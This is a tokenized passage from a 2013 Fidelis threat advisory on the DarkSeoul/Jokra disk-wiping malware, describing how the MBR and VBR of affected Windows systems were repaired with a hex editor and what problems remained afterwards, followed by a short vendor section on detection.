"the", "logical", "file", "system", "is", "recovered", "relevant", "forensic", "artifacts", "can", "be", "located", ".", "It", "will", "be"], ["important", "to", "note", "that", "a", "lot", "of", "files", "will", "be", "recoverable", "and", "a", "lot", "of", "system", "files", "are", "left", "untouched", "."], ["The", "wiper", "corrupts", "file", "systems", "very", "quickly", ",", "but", "the", "expense", "of", "this", "is", "leaving", "more", "files"], ["untouched", "and", "recoverable", "."], ["Note:", "When", "multiple", "partitions", "are", "suspected", "then", "it", "will", "be", "likely", "the", "recovery", "will", "need", "to", "be"], ["done", "manually", "with", "a", "hex", "editor", ".", "The", "method", "for", "this", "was", "also", "covered", "in", "advisory", "#1007", "."], ["Using", "a", "hex", "editor", "it", "is", "possible", "to", "repair", "an", "image", "with", "the", "backup", "VBR", "and", "build", "a", "new", "MBR", "to"], ["boot", "the", "affected", "computer", ".", "This", "comes", "with", "a", "warning", ",", "just", "being", "able", "to", "boot", "the", "machine", "and"], ["accessing", "the", "data", "within", "doesn't", "mean", "that", "system", "will", "operate", "properly", ".", "The", "system", "still", "has"], ["files", "that", "were", "corrupted", "by", "the", "malware", ",", "and", "some", "of", "those", "files", "will", "affect", "the", "user", "experience", "."], ["However", ",", "in", "our", "testing", "we", "were", "able", "to", "rebuild", "the", "MBR", "and", "recover", "the", "VBR", "to", "boot", "the"], ["affected", "system", "."], ["Our", "repaired", "system", "was", "missing", "the", "start", "button", "and", "a", "few", "of", "the", "shortcuts", "to", "executables", "on"], ["the", "desktop", "were", "no", "longer", "functioning", ".", "The", "XP", "system", "when", "repaired", "always", "asked", "to", "complete"], ["a", "chkdisk", "cycle", ",", "and", "on", "the", "whole", "didn\u2019t", "operate", "normally", ".", "The", "Windows", "7", "systems", "that", "were"], ["affected", "by", "the", "two", "malware", "samples", "did", "not", "experience", "these", "issues", ",", "and", "appeared", "to", "operate"], ["normally", ".", "Attempts", "to", "repair", "the", "XP", "system", "with", "the", "windows", "recovery", "CD", "always", "ended", "in", "a"], ["bluescreen", "error", "before", "the", "operation", "finished", "any", "repairing", "."], ["The", "Fidelis", "Take"], ["Fidelis", "XPS", "sensors", "detect", "the", "DarkSeoul/Jokra", "malware", "as", "it", "enters", "the", "network", "as"], ["\"Trojan", ".", "Win32.EraseMBR.b\".", "Fidelis", "XPS", "is", "capable", "of", "detecting", "this", "threat", "regardless", "of", "delivery"], ["method", "employed", "by", "the", "Threat", "Actors", "responsible", ".", "Fidelis", "XPS", "can", "detect", "and", "alert", "on"], ["executables", "such", "as", "the", "DarkSeoul", "malware", "multiple", "layers", "deep", "inside", "of", "zip", "files", ",", "or", "even"], ["XOR'ed", "inside", "of", "a", "weaponized", "MS", "Office", "document", "or", "Adobe", "PDF", "File", ".", "The", "Fidelis", "Threat"], ["Research", "and", "Network", "Forensics", "and", "Incident", "Response", "teams", "will", "continue", "to", "actively", "monitor"], ["the", "ever-evolving", "threat", "landscape", "for", "the", "latest", "threats", "to", "our", "customers", "network", "security", "."], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems"], ["Threat", "Advisory", "#1008"], ["Page", "5", "of", "5"], ["Rev", ".", "2013-02-21"], ["Darkseoul/Jokra", "Analysis", "And", "Recovery"]]}]]